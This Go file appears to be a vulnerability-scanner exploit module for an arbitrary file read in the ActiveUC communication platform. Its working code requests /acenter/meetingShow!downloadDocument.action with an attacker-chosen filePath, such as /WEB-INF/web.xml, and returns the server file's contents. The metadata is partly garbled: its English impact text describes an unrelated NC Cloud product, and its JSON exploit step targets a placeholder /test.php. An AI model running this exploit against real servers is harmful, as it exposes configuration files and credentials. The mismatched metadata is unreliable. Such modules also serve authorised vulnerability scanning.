package exploits

import (
	"errors"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "ActiveUC /acenter/meetingShow!downloadDocument.action File Read Vulnerability",
    "Description": "<p>The mobile Unified Communication Platform (Active UC) is a comprehensive communication platform, covering text, voice, video communication and other functions, designed to improve user communication efficiency and convenience, and provide a unified communication environment. ‌ The platform supports a variety of communication devices and protocols, with a high degree of compatibility and flexibility, can adapt to different network environments and work needs. Network mobile unified communication platform is a unified communication interface, VoIP phone system, email and other communication methods integration of enterprise IT platform, interface /acenter/meetingShow! downloadDocument.action has arbitrary file reads, which may cause an attacker to obtain arbitrary files from the server</p>",
    "Product": "ActiveUC",
    "Homepage": "http://www.iactive.com.cn/",
    "DisclosureDate": "2024-10-30",
    "PostTime": "2024-10-31",
    "Author": "3013320359@qq.com",
    "FofaQuery": "title=\"网动统一通信平台(Active UC)\" && body=\"Active UC\"",
    "GobyQuery": "title=\"网动统一通信平台(Active UC)\" && body=\"Active UC\"",
    "Level": "1",
    "Impact": "<p>Uf NC Cloud, a digital platform for large enterprises, focuses on digital management, digital operation and digital business to help large enterprises realize the comprehensive digitalization of people, finance, goods and customers, thereby driving business innovation and management reform, and redefining the height of the future together with enterprise managers. It provides customers with 14 industry categories and 68 sub-sectors for large enterprise groups, manufacturing, consumer goods, construction, real estate, finance and insurance, covering 18 major solutions such as digital marketing, intelligent manufacturing, financial sharing, and digital procurement to help enterprises fully land digital. There is an arbitrary file reading vulnerability in the NC Cloud word.docx interface</p>",
    "Recommendation": "<p>Follow the official patch release information to install the patch or upgrade to the latest version:<a href=\"http://www.iactive.com.cn/\">http://www.iactive.com.cn/</a></p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1%E5%B9%B3%E5%8F%B0/%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1%E5%B9%B3%E5%8F%B0ActiveUC%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "web.xml,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/WEB-INF/web.xml",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "网动统一通信平台 /acenter/meetingShow!downloadDocument.action 文件读取漏洞",
            "Product": "网动统一通信平台",
            "Description": "<p>网动统一通信平台（Active UC）是一款综合性的通信平台，涵盖了文字、语音、视频通讯等功能，旨在提升用户的沟通效率和便利性，提供一个统一的通信环境。‌ 该平台支持多种通信设备和协议，具有高度的兼容性和灵活性，能够适应不同的网络环境和工作需求。网动统一通信平台是采用统一的通信界面，将VoIP电话系统、电子邮件等多种沟通方式融合的企业IT平台，接口&nbsp;/acenter/meetingShow!downloadDocument.action&nbsp;存在任意文件读取，可能导致攻击者获取服务器任意文件<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.iactive.com.cn/\">http://www.iactive.com.cn/</a><br></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ActiveUC /acenter/meetingShow!downloadDocument.action File Read Vulnerability",
            "Product": "ActiveUC",
            "Description": "<p>The mobile Unified Communication Platform (Active UC) is a comprehensive communication platform, covering text, voice, video communication and other functions, designed to improve user communication efficiency and convenience, and provide a unified communication environment. ‌ The platform supports a variety of communication devices and protocols, with a high degree of compatibility and flexibility, can adapt to different network environments and work needs. Network mobile unified communication platform is a unified communication interface, VoIP phone system, email and other communication methods integration of enterprise IT platform, interface /acenter/meetingShow! downloadDocument.action has arbitrary file reads, which may cause an attacker to obtain arbitrary files from the server<br></p>",
            "Recommendation": "<p>Follow the official patch release information to install the patch or upgrade to the latest version:<a href=\"http://www.iactive.com.cn/\">http://www.iactive.com.cn/</a><br></p>",
            "Impact": "<p>Uf NC Cloud, a digital platform for large enterprises, focuses on digital management, digital operation and digital business to help large enterprises realize the comprehensive digitalization of people, finance, goods and customers, thereby driving business innovation and management reform, and redefining the height of the future together with enterprise managers. It provides customers with 14 industry categories and 68 sub-sectors for large enterprise groups, manufacturing, consumer goods, construction, real estate, finance and insurance, covering 18 major solutions such as digital marketing, intelligent manufacturing, financial sharing, and digital procurement to help enterprises fully land digital. There is an arbitrary file reading vulnerability in the NC Cloud word.docx interface<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9966"
}`
	postOrGet_rGq4PZU38rgN := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/acenter/meetingShow!downloadDocument.action?filePath=" + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/acenter/meetingShow!downloadDocument.action?filePath="
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/WEB-INF/web.xml": "?xml version",
			}
			// 函数继承
			uploadFileFunc := postOrGet_rGq4PZU38rgN

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.xml": {"/WEB-INF/web.xml", "?xml version"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_rGq4PZU38rgN

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		}))
}
